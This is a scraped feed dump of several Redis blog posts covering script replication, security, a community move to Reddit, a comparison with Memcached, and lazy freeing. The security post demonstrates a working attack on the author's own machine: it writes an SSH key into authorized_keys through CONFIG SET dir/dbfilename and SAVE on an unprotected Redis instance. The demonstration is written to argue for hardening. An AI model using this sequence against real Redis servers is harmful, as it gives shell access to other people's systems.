<br>It appends 1 million elements to the specified list and runs in 0.75 seconds in my testing environment. It’s just a few bytes, and runs inside the server, so replicating this script as script, and not as the 1 million commands resulting from the script execution, makes a lot of sense.
<br>
<br>There are scripts which are exactly the opposite. At the other side of the spectrum there is a script that calculates the average of 1 million integer elements stored into a list, and stores the result setting some key with SET.
<br>
<br>The effect of the script could be just: SET somekey 94.29
<br>
<br>But the actual execution is maybe 2 seconds of computation. Replicating this script as the resulting command is much better. However there is a difference between replicating scripts and replicating effects: both are optimal or suboptimal depending on the use case, but replicating scripts always work, even when it’s inefficient. It never creates a situation where the replication link has to transfer huge amount of data, nor it creates a situation where the slave has to do a lot more work than the master. This is why so far Redis always used to replicate scripts verbatim.
<br>
<br>However the most interesting part perhaps is that’s not just a matter of efficiency. When replicating scripts we need that each script is a *pure function*. Scripts executed with the same initial dataset, must produce always the same result. This requirement, prevents users from writing scripts using, for example, the TIME command, or SRANDMEMBER. Redis detects this dangerous condition and stops the script as soon as the first write command is going to be called.
<br>
<br>Yet there are many use cases for scripts using the current time, random numbers or random elements. Replicating the effects of the script also overcomes this limitation.
<br>
<br>So finally, and thanks to refactoring performed inside Redis in the previous months, it was possible to implement opt-in support for scripts effects replication. It is as trivial as calling, at the start of the script, the following command:
<br>
<br>    redis.replicate_commands()
<br>    … do something with the script …
<br>
<br>The script will be replicated only as a set of write commands.
<br>Actually there is no need to call replicate_commands() as the first command. It is enough to call it before any write, so the Lua script may even check the work to do and select the right replication model. If writes were already performed when replicate_commands() is called, it just returns false, and the normal whole script replication will be used, so the command will never prevent the script from running, even when misused.
<br>
<br>However we did not resisted to the temptation of doing more advanced and possibly dangerous things. I designed this feature with my colleague Yossi Gottleib from Redis Labs, and he had a very compelling use case for a dangerous feature allowing the exclusion of selected commands from the replication stream.
<br>
<br>The idea is that your script may do something like that:
<br>
<br>1) Call certain commands that write temporary values. Think at intersections between sets just to have a mental model.
<br>2) Perform some aggregation.
<br>3) Store a small result as the effect of the script.
<br>4) Discard the temporary values.
<br>
<br>There are a few legitimate use cases for the above pattern, and guess what, you don’t want to replicate the temporary writes to your AOF and slaves. You want replicate just step “3”. So in the end we decided that, when script effects replication is enabled, it is possible for the brave user, to select what replicate and what not, by using the following API:
<br>
<br>    redis.set_repl(redis.REPL_ALL); -- The default
<br>    redis.set_repl(redis.REPL_NONE); -- No replication at all
<br>    redis.set_repl(redis.REPL_AOF); -- Just AOF replication
<br>    redis.set_repl(redis.REPL_SLAVE); -- Just slaves replication
<br>
<br>There is a lot of room for misuse, but non expert users are very unlikely to touch this feature at all, and it can benefit who knows what to do with powerful tools.
<br>
<br>ETA
<br>---
<br>
<br>Both features will be available into Redis 3.2, that will be out as an RC in mid December 2015.
<br>Redis 3.2 is going to have many interesting new features at API level, exposed to users. A big part of the user base asked for this, after a period where we focused more into operations and internals maturity.
<br>
<br>Feel free to ask questions in the comments if you want to know more or have any doubt.
<br>
<br>Hacker News thread is here: https://news.ycombinator.com/item?id=10594236
<a href=\"http://antirez.com/news/97\">Comments</a>" nil "http://antirez.com/news/97" "259df5a297e8e00e078fea9ad89c6714") (49 (26588 31767 59739 840000) "http://antirez.com/news/96
" "A few things about Redis security " nil "Tue, 03 Nov 2015 08:53:04 +0000" "IMPORTANT EDIT: Redis 3.2 security improved by implementing protected mode. You can find the details about it here: https://www.reddit.com/r/redis/comments/3zv85m/new_security_feature_redis_protected_mode/
<br>
<br>From time to time I get security reports about Redis. It’s good to get reports, but it’s odd that what I get is usually about things like Lua sandbox escaping, insecure temporary file creation, and similar issues, in a software which is designed (as we explain in our security page here http://redis.io/topics/security) to be totally insecure if exposed to the outside world.
<br>
<br>Yet these bug reports are often useful since there are different levels of
<br>security concerning any software in general and Redis specifically. What you can
<br>do if you have access to the database, just modify the content of the database itself
<br>or compromise the local system where Redis is running?
<br>
<br>How important is a given security layer in a system depends on its security model.
<br>Is a system designed to have untrusted users accessing it, like a web server
<br>for example? There are different levels of authorization for different kinds of
<br>users?
<br>
<br>The Redis security model is: “it’s totally insecure to let untrusted clients access the system, please protect it from the outside world yourself”. The reason is that, basically, 99.99% of the Redis use cases are inside a sandboxed environment. Security is complex. Adding security features adds complexity. Complexity for 0.01% of use cases is not great, but it is a matter of design philosophy, so you may disagree of course.
<br>
<br>The problem is that, whatever we state in our security page, there are a lot of Redis instances exposed to the internet unintentionally. Not because the use case requires outside clients to access Redis, but because nobody bothered to protect a given Redis instance from outside accesses via fire walling, enabling AUTH, binding it to 127.0.0.1 if only local clients are accessing it, and so forth.
<br>
<br>Let’s crack Redis for fun and no profit at all given I’m the developer of this thing
<br>===
<br>
<br>In order to show the Redis “security model” in a cruel way, I did a quick 5 minutes experiment. In our security page we hint at big issues if Redis is exposed. You can read: “However, the ability to control the server configuration using the CONFIG command makes the client able to change the working directory of the program and the name of the dump file. This allows clients to write RDB Redis files at random paths, that is a security issue that may easily lead to the ability to run untrusted code as the same user as Redis is running”.
<br>
<br>So my experiment was the following: I’ll run a Redis instance in my Macbook Air, without touching the computer configuration compared to what I’ve currently. Now from another host, my goal is to compromise my laptop.
<br>
<br>So, to start let’s check if I can access the instance, which is a prerequisite:
<br>
<br>$ telnet 192.168.1.11 6379
<br>Trying 192.168.1.11...
<br>Connected to 192.168.1.11.
<br>Escape character is '^]'.
<br>echo \"Hey no AUTH required!\"
<br>$21
<br>Hey no AUTH required!
<br>quit
<br>+OK
<br>Connection closed by foreign host.
<br>
<br>Works, and no AUTH required. Redis is unprotected without a password set up, and so forth. The simplest thing you can do in such a case, is to write random files. Guess what? my Macbook Air happens to run an SSH server. What about trying to write something into ~/ssh/authorized_keys in order to gain access?
<br>
<br>Let’s start generating a new SSH key:
<br>
<br>$ ssh-keygen -t rsa -C \"crack@redis.io\"
<br>Generating public/private rsa key pair.
<br>Enter file in which to save the key (/home/antirez/.ssh/id_rsa): ./id_rsa
<br>Enter passphrase (empty for no passphrase):
<br>Enter same passphrase again:
<br>Your identification has been saved in ./id_rsa.
<br>Your public key has been saved in ./id_rsa.pub.
<br>The key fingerprint is:
<br>f0:a1:52:e9:0d:5f:e4:d9:35:33:73:43:b4:c8:b9:27 crack@redis.io
<br>The key's randomart image is:
<br>+--[ RSA 2048]----+
<br>|          .   O+.|
<br>|       . o o..o*o|
<br>|      = . + .+ . |
<br>|     o B o    .  |
<br>|    . o S    E . |
<br>|     .        o  |
<br>|                 |
<br>|                 |
<br>|                 |
<br>+-----------------+
<br>
<br>Now I’ve a key. My goal is to put it into the Redis server memory, and later to transfer it into a file, in a way that the resulting authorized_keys file is still a valid one. Using the RDB format to do this has the problem that the output will be binary and may in theory also compress strings. But well, maybe this is not a problem. To start let’s pad the public SSH key I generated with newlines before and after the content:
<br>
<br>$ (echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") > foo.txt
<br>
<br>Now foo.txt is just our public key but with newlines. We can write this string inside the memory of Redis using redis-cli:
<br>
<br>~~~~~~~~~~~~~~~~~~~
<br>NOTE: The following steps were altered in trivial ways to avoid that script kiddies cut & paste the attack, because from the moment this attack was published several Redis instances were compromised around the globe.
<br>~~~~~~~~~~~~~~~~~~~
<br>
<br>$ redis-cli -h 192.168.1.11
<br>192.168.1.11:6379> config set dbfilename \"backup.rdb\"
<br>OK
<br>192.168.1.11:6379> save
<br>OK
<br>(Ctrl+C)
<br>
<br>$ redis-cli -h 192.168.1.11 echo flushall
<br>$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
<br>
<br>Looks good. How to dump our memory content into the authorized_keys file? That’s
<br>kinda trivial.
<br>
<br>$ redis-cli -h 192.168.1.11
<br>192.168.1.11:6379> config set dir /Users/antirez/.ssh/
<br>OK
<br>192.168.1.11:6379> config get dir
<br>1) \"dir\"
<br>2) \"/Users/antirez/.ssh\"
<br>192.168.1.11:6379> config set dbfilename \"authorized.keys\"
<br>OK
<br>192.168.1.11:6379> save
<br>OK
<br>
<br>At this point the target authorized keys file should be full of garbage, but should also include our public key. The string does not have simple patterns so it’s unlikely that it was compressed inside the RDB file. Will ssh be so naive to parse a totally corrupted file without issues, and accept the only sane entry inside?
<br>
<br>$ ssh -i id_rsa antirez@192.168.1.11
<br>Enter passphrase for key 'id_rsa':
<br>Last login: Mon Nov  2 15:58:43 2015 from 192.168.1.10
<br>~ ➤ hostname
<br>Salvatores-MacBook-Air.local
<br>
<br>Yes. I successfully gained access as the Redis user, with a proper shell, in like five seconds. Courtesy of a Redis instance unprotected being, basically, an on-demand-write-this-file server, and in this case, by ssh not being conservative enough to deny access to a file which is all composed of corrupted keys but for one single entry. However ssh is not the problem here, once you can write files, even with binary garbage inside, it’s a matter of time and you’ll gain access to the system in one way or the other.
<br>
<br>How to fix this crap?
<br>===
<br>
<br>We say Redis is insecure if exposed, and the security model of Redis is to be accessed only by authorized and trusted clients. But this is unfortunately not enough. Users will still run it unprotected, and even worse, there is a tension
<br>between making Redis more secure *against* deployment errors, and making Redis
<br>easy to use for people just using it for development or inside secure environments
<br>where limits are not needed.
<br>
<br>Let’s make an example. Newer versions of Redis ship with the example redis.conf
<br>defaulting to “bind 127.0.0.1”. If you run the server without arguments, it will
<br>still bind all interfaces, since I don’t want to annoy users which are likely
<br>running Redis for development. To have to reconfigure an example server just to
<br>allow connections from other hosts is kinda a big price to pay, to win just
<br>a little bit of security for people that don’t care. However the example redis.conf
<br>that many users use as a template for their configuration, defaults to binding the
<br>localhost interface. Hopefully less deployments errors will be made.
<br>
<br>However this measures are not very effective, because unfortunately what most
<br>security unaware users will do after realizing that binding 127.0.0.1 is preventing
<br>them from connecting clients from the outside, is to just drop the bind line and
<br>restart. And we are back to the insecure configuration.
<br>
<br>Basically the problem is finding a compromise between the following three things:
<br>
<br>1. Making Redis accessible without annoyances for people that know what they do.
<br>
<br>2. Making Redis less insecure for people that don’t know what they do.
<br>
<br>3. My bias towards “1” instead of “2” because RTFM.
<br>
<br>Users ACLs to mitigate the problem
<br>===
<br>
<br>One way to add redundancy to the “isolation” concept of Redis from the outside world
<br>is to use the AUTH command. It’s very simple, you configure Redis in order to
<br>require a password, and clients authenticate via the AUTH command by using the
<br>configured password. The mechanism is trivial: passwords are not hashed, and are
<br>stated in cleartext inside the configuration file and inside the application, so
<br>it’s like a shared secret.
<br>
<br>While this is not resistant against people sniffing your TCP connections
<br>or compromising your application servers, it’s an effective layer of security
<br>against the obvious mistake of leaving unprotected Redis instances on the internet.
<br>
<br>A few notes about AUTH:
<br>
<br>1. You can use Redis as an oracle in order to test many passwords per second, but the password does not need to be stored inside a human memory, just inside the Redis config file and client configurations, so pick a very large one, and make it impossible to brute force.
<br>
<br>2. AUTH is sent when the connection is created, and most sane applications have persistent connections, so it is a very small cost to pay. It’s also an extremely fast command to execute, like GET or SET, disk is not touched nor other external system.
<br>
<br>3. It’s a good layer of protection even for well sandboxed environments. For an error an instance may end exposed, if not to the internet, at least to clients that should not be able to talk with it.
<br>
<br>Maybe evolving AUTH is the right path in order to gain more security, so
<br>some time ago I published a proposal to add “real users” in Redis: https://github.com/redis/redis-rcp/blob/master/RCP1.md
<br>
<br>This proposal basically adds users with ACLs. It’s very similar to AUTH in the way it works and in the speed of execution, but different users have different capabilities. For example normal users are not able to access administrative commands by default, so no “CONFIG SET dir” for them, and no issues like the exploit above.
<br>
<br>The default user can yet run the normal commands (so the patches people sent me about Lua sandboxing, that I applied, are very useful indeed), and an admin user must be configured in order to use administration commands. However what we could do to make Redis more user friendly is to always have an “admin” user with empty password which is accepted if the connection comes from the loopback interface (but it should be possible to disable this feature).
<br>
<br>ACLs, while not perfect, have certain advantages. When Redis is exposed to the internet in the proper way, proxied via SSL, to have an additional layer of access control is very useful. Even when no SSL is used since we have just local clients, to protect with more fine grained control what clients can do has several advantages. For instance it can protect against programming or administration errors: FLUSHALL and FLUSHDB could be not allowed to normal users, the client for a Redis monitoring service would use an user only allowing a few selected commands, and so forth.
<br>
<br>Users that don’t care about protecting their instances will stil have a database which is accessible from the outside, but without admin commands available, which still makes things insecure from the point of view of the data contained inside the database, but more secure from the point of view of the system running the Redis instance.
<br>
<br>Basically it is impossible to reach the goal of making Redis user friendly by default and resistant against big security mistakes of users spinning an instance bound to a public IP address. However fixing bugs in the API that may allow to execute untrusted code with the same privileges of the Redis process, shipping a more conservative default configuration, and implementing multiple users with ACLs, could improve the current state of Redis security without impacting much the experience of normal Redis users that know what they are doing.
<br>
<br>Moreover ACLs have the advantage of allowing application developers to create
<br>users that match the actual limits of specific clients in the context of the
<br>application logic, making mistakes less likely to create big issues.
<br>
<br>A drawback of even this simple layer of security is that it adds complexity,
<br>especially in the context of replication, Redis Sentinel, and other systems that
<br>must all be authentication aware in order to work well in this new context. However it’s probably an effort that must be incrementally done.
<br>
<br>Hacker News: https://news.ycombinator.com/item?id=10537852
<br>
<br>Reddit: https://www.reddit.com/r/redis/comments/3rby8c/a_few_things_about_redis_security/
<a href=\"http://antirez.com/news/96\">Comments</a>" nil "http://antirez.com/news/96" "587e388476f6b68398cb3555045fcbe4") (48 (26588 31767 59099 791000) "http://antirez.com/news/95
" "Moving the Redis community on Reddit " nil "Thu, 22 Oct 2015 08:14:38 +0000" "I’m just back from the Redis Dev meeting 2015. We spent two incredible days talking about Redis internals in many different ways. However while I’m waiting to receive private notes from other attenders, in order to summarize in a blog post what happened and what were the most important ideas exposed during the meetings, I’m going to touch a different topic here. I took the non trivial decision to move the Redis mailing list, consisting of 6700 members, to Reddit.
<br>
<br>This looks like a crazy ideas probably in some way, and “to move” is probably not the right verb, since the ML will still exist. However it will only be used in order to receive announcements of new releases, critical informations like security related ones, and from time to time, links to very important discussions that are happening on Reddit.
<br>
<br>Why to move? We have a huge mailing list that served us for years at this point, and there is a decent amount of traffic going on.
<br>People go there to get some help, to provide new ideas, and so forth. However while we have some traffic the Redis mailing list is IMHO far from the “vital” thing it should be, considering the number of users using Redis currently. For most parts we see the same questions again and again, and is hard to understand if a reply is really worthwhile or not. Moreover an important topic sometimes slides away because new topics arrive, sometimes without getting much attention at all. It’s like if the ML is just a far echo of the Redis popularity, not the center of its community.
<br>
<br>Twitter, while being a tool completely unsuitable for becoming the center of a community that needs to discuss things at length, is completely different, and gives me a feedback about how the Redis ML is in some way broken. It’s a lot more vital and it is possible to get quality feedbacks, but everything is limited to 140 characters in flat threads where eventually it is kinda impossible to continue any sane discussion. However Twitter and other signals I get, are the proof that people *moved away* from emails. I bet an huge amount of users subscribed to the ML just archive it into a label to read it never or seldom.
<br>
<br>So why Reddit instead? Because it’s the center of the most vital communities on the internet today. Because it’s centered on a voting system, so if an user asks for help, even if you don’t want to contribute, you can use the comment voting to tell the difference between a lame request and a great one, a poor reply and an outstanding one. Reddit also allows to vote the topics so that things which are important for the community will get more contributions. Has a side bar that can be used for FAQs and other important pointers, and has a ton of existing subscribers.
<br>
<br>Reddit also contains “gamification” elements that may be useful and funny. For example you can associate small sentences or images to your username in a given sub-reddit, in order to state, for example, if you use Redis for caching, as a store, for messaging or whatever. Your reply in a given context can be read more clearly if it is possible to understand what kind of Redis user you are.
<br>
<br>It is possible to write guidelines in the submission page, so that people realize what to provide before posting. For example we’ll have warnings telling you to post the INFO output of your master and slaves if you want us to investigate your replication issues.
<br>
<br>So, what happens now? I asked Reddit admins to get access to /r/redis, which is a sub created years ago but not actively administered apparently. When I receive the admin privileges I’ll setup the sub in order to only accent comment submissions (not direct links, you’ll be still able to post a link if you comment it). At this point the Redis ML will be modified in order to moderate each single message, we’ll advice people posting help questions to go on Reddit. The Redis.io community page will be updated to instruct new users about Reddit being our primary discussion forum.
<br>
<br>Why not using Discourse or Stack Overflow, you’ll ask? SO is great but is not suitable for general conversation, and we need this a lot. People will continue to post Redis questions on SO and we’ll continue to reply, of course. Discourse is more an evolution of the mailing list we are using, but is not technically speaking a “social site”, we want to go where communities are already and where voting things is the main idea, so that as the Redis community grow we find a way to filter the most interesting contribs and highlight them.
<br>
<br>Maybe the experiment will fail and we’ll return back to the mailing list, or we’ll try Discourse, but I think a too important change in the way programmers communicate is happening in order to ignore it. I must try. I think email lost in some way, it is no longer something scalable. For me it lost several years ago, I rarely reply to emails at all, since they are a tool that does not take into account people inability to scale reading too many messages. I hope we’ll have a great time on Reddit. See you there!
<br>
<br>P.s. if you are a Reddit admin reading this, please evaluate my request to take ownership of /r/redis here: https://www.reddit.com/r/redditrequest/comments/3pnwrx/requesting_rredis/
<a href=\"http://antirez.com/news/95\">Comments</a>" nil "http://antirez.com/news/95" "548c81961c4d8f9096e1771b267064f0") (47 (26588 31767 58786 527000) "http://antirez.com/news/94
" "Clarifications about Redis and Memcached " nil "Sat, 26 Sep 2015 16:16:14 +0000" "If you know me, you know I’m not the kind of guy that considers competing products a bad thing. I actually love the users to have choices, so I rarely do anything like comparing Redis with other technologies.
<br>However it is also true that in order to pick the right solution users must be correctly informed.
<br>
<br>This post was triggered by reading a blog post published by Mike Perham, that you may know as the author of a popular library called Sidekiq, that happens to use Redis as backend. So I would not consider Mike a person which is “against” Redis at all. Yet in his blog post that you can find at the URL http://www.mikeperham.com/2015/09/24/storing-data-with-redis/ he states that, for caching, “you should probably use Memcached instead [of Redis]”. So Mike simply really believes Redis is not good for caching, and he arguments his thesis in this way:
<br>
<br>1) Memcached is designed for caching.
<br>2) It performs no disk I/O at all.
<br>3) It is multi threaded and can handle 100,000s of requests by scaling multi core.
<br>
<br>I’ll address the above statements, and later will provide further informations which are not captured by the above sentences and which are in my opinion more relevant to most caching users and use cases.
<br>
<br>Memcached is designed for caching: I’ll skip this since it is not an argument. I can say “Redis is designed for caching”. So in this regard they are exactly the same, let’s move to the next thing.
<br>
<br>It performs no disk I/O at all: In Redis you can just disable disk I/O at all if you want, providing you with a purely in-memory experience. Except, if you really need it, you can persist the database only when you are going to reboot, for example with “SHUTDOWN SAVE”. The bottom line here is that Redis persistence is an added value even when you don’t use it at all.
<br>
<br>It is multi threaded: This is true, and in my goals there is to make Redis I/O threaded (like in memcached, where the data access itself is not threaded, basically). However Redis, especially using pipelining, can serve an impressive amount of requests per second per thread (half a million is a common figure with very intensive pipelining. Without pipelining it is around 100,000 ops/sec). In the vanilla caching scenario where each Redis instance is the same, works as a master, disk ops are disabled, and sharding is up to the client like in the “memcached sharding model”, to spin multiple Redis processes per system is not terrible.  Once you do this what you get is a shared-nothing multi threaded setup so what counts is the amount of operations you can serve per single thread. Last time I checked Redis was at least as fast as memcached per each thread. Implementations change over time so the edge today may be of the one or the other, but I bet they provide near performances since they both tend to maximize the resources they can use. Memcached multi threading is still an advantage since it makes things simpler to use and administer, but I think it is not a crucial part.
<br>
<br>There is more. Mike talks of operations per second without citing the *quality* of operations. The thing is in systems like Redis and Memcached the cost of command dispatching and I/O is dominating compared to actually touching the in-memory data structures. So basically in Redis executing a simple GET, a SET, or a complex operation like a ZRANK operation is about the same cost. But what you can achieve with a complex operation is a lot more work from the point of view of the application level. Maybe instead of fetching five cached values you can just send a small Lua script. So the actual “scalability” of the two systems have many dimensions, and what you can achieve is one of those.
<br>
<br>Of Mike’s concerns the only valid I can see is multi threading which, if we consider Redis in its special case of memcached replacement, may be addressed executing multiple processes, or simply by executing just one since it will be very very hard to saturate one thread doing memcached alike operations.
<br>
<br>The real differences
<br>—
<br>
<br>Now it’s time to talk about the *real* differences between the two systems.
<br>
<br>* Memory efficiency
<br>
<br>This is where Memcached used to be better than Redis. In a system designed to represent a plain string to string dictionary, it is simpler to make better use of memory. This difference is not dramatic and it’s like 5 years I don’t check it, but it used to be noticeable.
<br>
<br>However if we consider memory efficiency of a long running process, things are a bit different. Read the next section.
<br>
<br>But again to really evaluate memory efficiency, you should put into the bag that specially encoded small aggregated values in Redis are very memory efficient. For example sets of small integers are represented internally as an array of 8, 16, 32 or 64 bits integers, and are accessed in logarithmic time when you want to check the existence of some since they are ordered, so binary search can be used.
<br>
<br>The same happens when you use hashes to represent objects instead of resorting to JSON. So the real memory efficiency must be evaluated with an use case at hand.
<br>
<br>* Redis LRU vs Slab allocator
<br>
<br>Memcached is not perfect from the point of view of memory utilization. If you happen to have an application that dramatically change the size of the cached values over time, you are likely to incur severe fragmentation and the only cure is a reboot. Redis is a lot more deterministic from this point of view.
<br>
<br>Moreover Redis LRU was lately improved a lot, and is now a very good approximation of real LRU. More info can be found here: http://redis.io/topics/lru-cache. If I understand correctly, memcached LRU still expires according to its slab allocator so sometimes the behavior may be far from real LRU, but I would like to hear what experts have to say about this. If you want to test Redis LRU you now can using the redis-cli LRU testing mode available in recent versions of Redis.
<br>
<br>* Smart caching
<br>
<br>If you want to use Redis for caching, and use it ala-memcached, you are truly missing something. This is the biggest mistake in Mike’s blog post in my opinion. People are switching to Redis more and more because they discovered that they can represent their cached data in more useful ways. What to retain the latest N items of something? Use a capped list. Want to take a cached popularity index? Use a sorted set, and so forth.
<br>
<br>* Persistence and Replication
<br>
<br>If you need those, they are very important assets. For example using this model scaling a huge load of reads is very simple. The same about restarts with persistence, the ability to take cache snapshots over time, and so forth. But it’s totally fair to have usages where both features are totally irrelevant. What I want to say here is that there are “pure caching” use cases where persistence and replication are important.
<br>
<br>* Observability
<br>
<br>Redis is very very observable. It has detailed reporting about a ton of internal metrics, you can SCAN the dataset, observe the expiration of objects. Tune the LRU algorithm. Give names to clients and see them reported in CLIENT LIST. Use “MONITOR” to debug your application, and many other advanced things. I believe this to be an advantage.
<br>
<br>* Lua scripting
<br>
<br>I believe Lua scripting to be an impressive help in many caching use cases. For example if you have a cached JSON blob, with a Lua command you can extract a single field and return it to the client instead of transferring everything (you can do the same, conceptually, using Redis hashes directly to represent objects).
<br>
<br>Conclusions
<br>—
<br>
<br>Memcached is a great piece of software, I read the source code multiple times, it was a revolution in our industry, and you should check if for you is a better bet compared to Redis. However things must be evaluated for what they are, and in the end I was a bit annoyed to read Mike’s report and very similar reports over the years. So I decided to show you my point of view. If you find anything factually incorrect, ping me and I’ll update the blog post according with “EDIT” sections.
<a href=\"http://antirez.com/news/94\">Comments</a>" nil "http://antirez.com/news/94" "709bc2538145b9fc2da45ede2f42d9fb") (46 (26588 31767 58335 890000) "http://antirez.com/news/93
" "Lazy Redis is better Redis " nil "Sat, 26 Sep 2015 07:56:32 +0000" "Everybody knows Redis is single threaded. The best informed ones will tell you that, actually, Redis is *kinda* single threaded, since there are threads in order to perform certain slow operations on disk. So far threaded operations were so focused on I/O that our small library to perform asynchronous tasks on a different thread was called bio.c: Background I/O, basically.
<br>
<br>However some time ago I opened an issue where I promised a new Redis feature that many wanted, me included, called “lazy free”. The original issue is here: https://github.com/antirez/redis/issues/1748.
<br>
<br>The gist of the issue is that Redis DEL operations are normally blocking, so if you send Redis “DEL mykey” and your key happens to have 50 million objects, the server will block for seconds without serving anything in the meantime. Historically this was accepted mostly as a side effect of the Redis design, but is a limit in certain use cases. DEL is not the only blocking command, but is a special one, since usually we say: Redis is very fast as long as you use O(1) and O(log_N) commands. You are free to use O(N) commands but be aware that it’s not the case we optimized for, be prepared for latency spikes.
<br>
<br>This sounds reasonable, but at the same time, even objects created with fast operations need to be deleted. And in this case, Redis blocks.
<br>
<br>The first attempt
<br>—
<br>
<br>In a single-threaded server the easy way to make operations non-blocking is to do things incrementally instead of stopping the world. So if there is to free a 1 million allocations, instead of blocking everything in a for() loop, we can free 1000 elements each millisecond, for example. The CPU time used is the same, or a bit more, since there is more logic, but the latency from the point of view of the user is ways better. Maybe those cycles to free 1000 elements per millisecond were not even used. Avoiding to block for seconds is the key here. This is how many things inside Redis work: LRU eviction and keys expires are two obvious examples, but there are more, like incremental rehashing of hash tables.
<br>
<br>So this was the first thing I tried: create a new timer function, and perform the eviction there. Objects were just queued into a linked list, to be reclaimed slowly and incrementally each time the timer function was called. This requires some trick to work well. For example objects implemented with hash tables were also reclaimed incrementally using the same mechanism used inside Redis SCAN command: taking a cursor inside the dictionary and iterating it to free element after element. This way, in each timer call, we don’t have to free a whole hash table. The cursor will tell us where we left when we re-enter the timer function.
<br>
<br>Adaptive is hard
<br>—
<br>
<br>Do you know what is the hard part with this? That this time, we are doing a very special task incrementally: we are freeing memory. So if while we free memory incrementally, the server memory raises very fast, we may end, for the sake of latency, to consume an *unbound* amount of memory. Which is very bad. Imagine this, for example:
<br>
<br>    WHILE 1
<br>        SADD myset element1 element2 … many many many elements
<br>        DEL myset
<br>    END
<br>
<br>If deleting myset in the background is slower compared to our SADD call adding tons of elements per call, our memory usage will grow forever.
<br>
<br>However after a few experiments, I found a way to make it working very well. The timer function used two ideas in order to be adaptive to the memory pressure:
<br>
<br>1. Check the memory tendency: it is raising or lowering? In order to adapt how aggressively to free.
<br>2. Also adapt the timer frequency itself based on “1”, so that we don’t waste CPU time when there is little to free, with continuous interruptions of the event loop. At the same time the timer could reach ~300 HZ when really needed.
<br>
<br>A small portion of code, from the now no longer existing function implementing this ideas:
<br>
<br>    /* Compute the memory trend, biased towards thinking memory is raising
<br>     * for a few calls every time previous and current memory raise. */
<br>    if (prev_mem < mem) mem_trend = 1;
<br>    mem_trend *= 0.9; /* Make it slowly forget. */
<br>    int mem_is_raising = mem_trend > .1;
<br>
<br>    /* Free a few items. */
<br>    size_t workdone = lazyfreeStep(LAZYFREE_STEP_SLOW);
<br>
<br>    /* Adjust this timer call frequency according to the current state. */
<br>    if (workdone) {
<br>        if (timer_period == 1000) timer_period = 20;
<br>        if (mem_is_raising && timer_period > 3)
<br>            timer_period--; /* Raise call frequency. */
<br>        else if (!mem_is_raising && timer_period < 20)
<br>            timer_period++; /* Lower call frequency. */
<br>    } else {
<br>        timer_period = 1000;    /* 1 HZ */
<br>    }
<br>
<br>It’s a good trick and it worked very well. But still it was kinda sad we have to do this operation in a single thread. There was a lot of logic to handle that well, and anyway when the lazy free cycle was very busy, operations per second were reduced to around 65% of the norm.
<br>
<br>Freeing objects in a different thread would be much simpler: freeing is almost always faster than adding new values in the dataset, if there is a thread which is busy doing only free operations.
<br>For sure there is some contention between the main thread calling the allocator and the lazy free thread doing the same, but Redis spends a fraction of its time on allocations, and much more time on I/O, command dispatching, cache misses, and so forth.
<br>
<br>However there was a big problem with implementing a threaded lazy free: Redis itself. The internal design was totally biased towards sharing objects around. After all they are reference counted right? So why don’t share as much as possible? We can save memory and time. A few examples: if you do SUNIONSTORE you end with shared objects in the target set. Similarly, client output buffers have lists of objects to send to the socket as reply, so during a call like SMEMBERS all the set members may end shared in the output buffer list. So sharing objects sounds so useful, lovely, wonderfully, greatly cool.
<br>
<br>But, hey, there is something more here. If after an SUNIONSTORE I re-load the database, the objects will be unshared, so the memory suddenly may jump to more than it was. Not great. Moreover what happens when we send replies to clients? We actually *glue together* objects into plain buffers when they are small, since otherwise doing many write() calls is not efficient! (free hint, writev() does not help). So we are mostly copying already. And in programming when something is not useful, but exists, it is likely a problem.
<br>
<br>And indeed each time you had to access a value, inside a key containing an aggregate data type, you had to traverse the following:
<br>
<br>    key -> value_obj -> hash table -> robj -> sds_string
<br>
<br>So what about getting rid of “robj” structures entirely and converting aggregate values to be made just of hash tables (or skiplists) of SDS strings? (SDS is the library we use inside Redis for strings).
<br>There is a problem with that. Immagine a command like SADD myset myvalue. We can’t take client->argv[2], for example, and just reference it in the hash table implementing the set. We have to *duplicate* values sometimes and can’t reuse the ones already existing in the client argument vector, created when the command was parsed. However Redis performance is dominated by cache misses, so maybe we can compensate this with one indirection less?
<br>
<br>So I started to work to this new lazyfree branch, and tweeting about it on Twitter without any context so that everybody was thinking I was like desperate or crazy (a few eventually asked WTF this lazyfree thing was). So what I did?
<br>
<br>1. Change client output buffers to use just dynamic strings instead of robj structures. Values are always copied when there is to create a reply.
<br>2. Convert all the Redis data types to use SDS strings instead of shared robj structures. Sounds trivial? ~800 highly bug sensitive lines changed in the course of multiple weeks. But now all tests are passing.
<br>3. Rewrite lazyfree to be threaded.
<br>
<br>The result is that Redis is now more memory efficient since there are no robj structures around in the implementation of the data structures (but they are used in the code paths where there is a lot of sharing going on, for example during the command dispatch and replication). Threaded lazy free works great and is faster than the incremental one to reclaim memory, even if the implementation of the incremental one is something I like a lot and was not so terrible even compared with the threaded one. But now, you can delete a huge key and the performance drop is negligible which is very useful. But, the most interesting thing is, Redis is now faster in all the operations I tested so far. Less indirection was a real winner here. It is faster even in unrelated benchmarks just because the client output buffers are now simpler and faster.
<br>In the end I deleted the incremental lazy freeing implementation from the branch, to retain only the threaded one.
<br>
<br>A note about the API
<br>—
<br>
<br>However what about the API? We still have a blocking DEL, the default is the same, since DEL in Redis means: reclaim memory now. I didn’t like the idea of changing that. So now you have a new command called UNLINK which more clearly states what is happening to the value.
<br>
<br>UNLINK is a smart command: it calculates the deallocation cost of an object, and if it is very small it will just do what DEL is supposed to do and free the object ASAP. Otherwise the object is sent to the background queue for processing. Otherwise the two commands are identical from the point of view of the keys space semantics.
<br>
<br>FLUSHALL / FLUSHDB non blocking variants were also implemented, but still not at API level, they’ll just take a LAZY option that if given will change the behavior.
<br>
<br>Not just lazy freeing
<br>—
<br>
<br>Now that values of aggregated data types are fully unshared, and client output buffers don’t contain shared objects as well, there is a lot to exploit. For example it is finally possible to implement threaded I/O in Redis, so that different clients are served by different threads. This means that we’ll have a global lock only when accessing the database, but the clients read/write syscalls and even the parsing of the command the client is sending, can happen in different threads. This is a design similar to memcached, and one I look forward to implement and test.
<br>
<br>Moreover it is now possible to implement certain slow operations on aggregated data types in another thread, in a way that only a few keys are “blocked” but all the other clients can continue. This can be achieved in a very similar way to what we do currently with blocking operations (see blocking.c), plus an hash table to store what keys are currently busy and with what client. So if a client asks for something like SMEMBERS it is possible to lock just the key, process the request creating the output buffer, and later release the key again. Only clients trying to access the same key will be blocked if the key is blocked.
<br>
